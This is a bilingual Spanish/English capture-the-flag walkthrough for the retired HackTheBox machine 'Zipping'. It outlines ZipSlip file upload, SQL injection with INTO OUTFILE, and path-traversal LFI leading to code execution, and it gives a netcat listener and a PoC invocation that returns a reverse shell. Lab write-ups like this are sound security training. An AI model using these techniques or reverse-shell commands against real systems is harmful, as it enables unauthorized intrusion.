# Zipping [EASY]

> **ES:** Máquina Easy Linux con upload de ZIPs (resumes PDF) vulnerable a ZipSlip/PHP + SQLi con INTO OUTFILE hacia RCE. PoC local en esta carpeta.
> **EN:** Easy Linux machine with ZIP upload (PDF resumes) vulnerable to ZipSlip/PHP + SQLi with INTO OUTFILE to RCE. Local PoC in this folder.

| Campo | Valor |
|-------|-------|
| **Dificultad / Difficulty** | Easy |
| **OS** | Linux |
| **Estado / Status** | Retired |
| **URL** | https://app.hackthebox.com/machines/Zipping |

## 📂 Opciones de solución en esta carpeta / Solution options in this folder

| # | Opción / Option | Archivo / File |
|---|-----------------|----------------|
| 1 | Síntesis ES/EN (este archivo) | `Walkthrough.md` |
| 2 | PoC SQLi → OUTFILE | `HTB_Zipping_poc.py` ([saoGITo/HTB_Zipping](https://github.com/saoGITo/HTB_Zipping), acceso 2026-09-25) |
| 3 | Video | IppSec ([ver en índice](https://ippsec.rocks/)) |

## 🎯 Objetivo / Objective

> **ES:** `user.txt` y `root.txt` vía upload abusado + SQLi, y escalada posterior (pendiente de detallar).
> **EN:** `user.txt` and `root.txt` via abused upload + SQLi, then privesc (pending detail).

## 🛠️ Herramientas / Tools

- `nmap`, `feroxbuster`, `nc`/`rlwrap`, `python3` + `requests`

## 📝 Pasos / Steps

### 1. Reconocimiento / Recon

```bash
echo "10.10.11.229 zipping.htb" | sudo tee -a /etc/hosts
nmap -sC -sV zipping.htb
```

**Resultado / Result:** Web con funcionalidad de subida de ZIP (resumes en PDF).

### 2. Upload → RCE / Upload to RCE

> **ES:** Dos vías documentadas: (a) ZIP con PDF que lleva PHP + null byte en el nombre (ZipSlip); (b) SQLi en `shop/index.php?page=product&id=` con `INTO OUTFILE` a `/var/lib/mysql/` + LFI por traversal (`page=../../../../var/lib/mysql/rvsl...`). El PoC local usa (b).
> **EN:** Two documented paths: (a) ZIP with PHP-bearing PDF + null byte filename (ZipSlip); (b) SQLi in `shop/index.php?page=product&id=` with `INTO OUTFILE` to `/var/lib/mysql/` + LFI traversal. The local PoC uses (b).

```bash
nc -nvlp 4444
python3 HTB_Zipping_poc.py <TU_IP> 4444
```

**Resultado / Result:** reverse shell → `user.txt`.

### 3. Root — pendiente de documentar / pending documentation

## 📚 Fuentes / Sources

- PoC: [saoGITo/HTB_Zipping](https://github.com/saoGITo/HTB_Zipping) — saoGITo — acceso 2026-09-25
- Video: IppSec (`C78yku9WC0o`) vía [dataset](https://ippsec.rocks/) — acceso 2026-09-24
- Foro: [Official Zipping Discussion](https://forum.hackthebox.com/t/official-zipping-discussion/295961) — HTB Forum
- Autor notas: Apuromafo

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de contenido activo.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish active content flags.

_Fecha de edición: 2026-09-25_
